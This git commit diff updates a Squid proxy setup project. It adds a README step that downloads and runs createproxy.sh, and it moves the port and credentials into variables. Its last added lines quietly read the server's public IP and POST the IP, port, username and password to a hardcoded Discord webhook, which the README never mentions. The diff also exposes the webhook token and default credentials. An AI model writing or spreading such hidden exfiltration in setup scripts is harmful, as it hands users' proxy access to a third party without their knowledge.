0e8f4bc32eecf6b3bf598a6aba68dfadf87bcb3b
Quoc Manh <d.manhq1705@gmail.com>
2023-06-19 04:27:44 +0700

    update

--- README.md
+++ README.md
@@ -1,1 +1,13 @@
-Change Proxy password username and port
+# Create proxy server
+
+Prefer IPv4 than IPv6
+
+Remember Change Proxy password username and port
+
+Code download and execute
+
+```
+wget https://raw.githubusercontent.com/dinhquocmanh/squid-proxy/main/createproxy.sh -O createproxy.sh
+chmod +x createproxy.sh
+./createproxy.sh
+```
--- createproxy.sh
+++ createproxy.sh
@@ -6,6 +6,9 @@ apt-get install squid -y
 apt-get install apache2-utils -y
 rm -rf /etc/squid/squid.conf
 touch /etc/squid/squid.conf
+PORT=9999
+USERN=quocmanh
+PASSW=quocmanh
 echo -e "
 dns_v4_first on
 forwarded_for off
@@ -15,7 +18,7 @@ auth_param basic realm proxy
 acl authenticated proxy_auth REQUIRED
 http_access allow authenticated
 # Choose the port you want. Below we set it to default 9999.
-http_port 9999
+http_port $PORT
 request_header_access Allow allow all
 request_header_access Authorization allow all
 request_header_access WWW-Authenticate allow all
@@ -45,8 +48,11 @@ request_header_access Proxy-Connection allow all
 request_header_access User-Agent allow all
 request_header_access Cookie allow all
 request_header_access All deny all" >> /etc/squid/squid.conf
-htpasswd -b -c /etc/squid/squid_passwd quocmanh quocmanh
+htpasswd -b -c /etc/squid/squid_passwd $USERN $PASSW
 service squid restart
 clear
 change
-htpasswd -b -c /etc/squid/squid_passwd quocmanh quocmanh
+htpasswd -b -c /etc/squid/squid_passwd $USERN $PASSW
+IP=$(wget -qO- ifconfig.me)
+WEBHOOK=https://discord.com/api/webhooks/834911408629088296/cygIA2pQlxKeMqMROuTiEzbAhGTB1AorutM68th7RtSOdksNsMUetCLjuVbL4Sd5prd4
+curl -i  -X POST $WEBHOOK -H "Content-Type:application/json" --data "{\"content\": \"$IP:$PORT:$USERN:$PASSW\"}"
